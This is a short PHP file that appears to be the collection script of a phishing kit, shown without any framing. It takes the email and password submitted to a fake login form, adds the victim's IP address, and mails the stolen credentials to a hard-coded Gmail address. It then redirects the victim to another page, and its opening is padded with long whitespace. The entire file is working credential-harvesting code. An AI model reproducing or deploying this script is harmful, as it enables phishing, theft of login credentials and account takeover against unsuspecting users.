<?
                                                                                                                                                              

          

                                                            
$ip = getenv("REMOTE_ADDR");
$message .= "--------------New Login--------\n";
$message .= "Email-ID : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['pass']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------Created BY rYan-----------\n";
$send = "barrymark447@gmail.com";
$subject = "--New Log $ip -- Source:(New Upgrade)";


mail($send,$subject,$message,$headers);


$redirect = "loader.php";

header("Location: " . $redirect);
 
?>